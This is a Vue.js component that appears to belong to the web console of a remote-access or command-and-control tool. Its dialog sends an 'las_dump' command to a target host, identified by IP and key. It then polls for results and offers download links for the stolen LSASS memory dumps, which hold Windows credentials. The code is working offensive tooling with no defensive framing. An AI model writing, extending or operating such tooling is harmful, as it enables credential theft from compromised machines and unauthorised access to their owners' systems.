<template>
  <el-dialog
    v-loading="lsassLoading"
    element-loading-background="rgba(0, 0, 0, 0.5)"
    title="LSASS"
    width="70%"
    top="10vh"
    :visible.sync="lsadata.lsassVisible"
    @close="lsassClose"
  >
    <div slot="title">
      {{ lsadata.ip }} — LSASS
    </div>
    <div>
      <el-button type="primary" icon="el-icon-refresh" plain @click="sendLsass">获取LSASS</el-button>
    </div>
    <br>
    <el-table
      :data="lsassData"
      height="400px"
      max-height="400px"
      border
    >
      <el-table-column prop="id" label="ID" width="60"></el-table-column>
      <el-table-column prop="file_path" label="文件位置" :show-overflow-tooltip="true" min-width="50%"></el-table-column>
      <el-table-column prop="update_time" label="获取时间" min-width="30%"></el-table-column>
      <el-table-column label="操作" align="center" width="180">
        <template slot-scope="{row}">
          <el-button type="success" size="mini" plain @click="downloadLsass(row)">下载Lsass</el-button>
        </template>
      </el-table-column>
    </el-table>
  </el-dialog>
</template>

<script>
import { submitTask, getLsass } from '@/api/consoleApi'
import { getToken } from '@/utils/auth'
export default {
  name: 'Lsass',
  props: {
    lsadata: {
      type: Object,
      default: () => {}
    }
  },
  data() {
    return {
      baseUrl: 'https://baidu.com/index.php',
      lsassLoading: false,
      timer: '',
      lsassData: []
    }
  },
  watch: {
    lsadata: {
      handler: function(data) {
        if (data.lsassVisible === true) {
          this.lsassLoading = true
          this.init(data)
        }
      },
      deep: true
    }
  },
  methods: {
    // 获取Lsass
    init(val) {
      this.lsassLoading = true
      const data = {
        'token': getToken(),
        'key': val.key
      }
      getLsass(data).then(response => {
        if (response.code === 20000 && response.status === true) {
          this.lsassData = response.data
        } else {
          this.$message({
            message: response.msg,
            type: 'error'
          })
        }
        this.lsassLoading = false
      })
    },
    // 发送获取Lsass指令
    sendLsass() {
      const data = {
        'key': this.lsadata.key,
        'content': 'las_dump',
        'type': 'las_dump',
        'token': getToken()
      }
      // 提交
      submitTask(data).then(response => {
        if (response.code === 20000) {
          this.$notify.success({
            title: 'info',
            message: '获取LSASS发送成功!!',
            duration: 2000,
            showClose: false
          })
          this.lsassData = []
          this.lsassLoading = true
          // 多次提交，保留一个定时器
          clearInterval(this.timer)
          this.timer = setInterval(() => {
            this.init(data)
          }, 3000)
        }
      })
    },
    // 下载到本地
    downloadLsass(row) {
      var save_name = row['id'] + '_' + this.lsadata.ip + '_' + this.lsadata.key + '.gz'
      var downloadLink = this.baseUrl + '/M2/download_hl?token=' + getToken() + '&path=' + row.file_path + '&save_name=' + save_name + '&t=' + Math.round(new Date())
      window.open(downloadLink)
    },
    // 关闭
    lsassClose() {
      clearInterval(this.timer)
      this.lsassData = []
      this.lsadata.lsassVisible = false
    }
  }
}
</script>

<style>
</style>
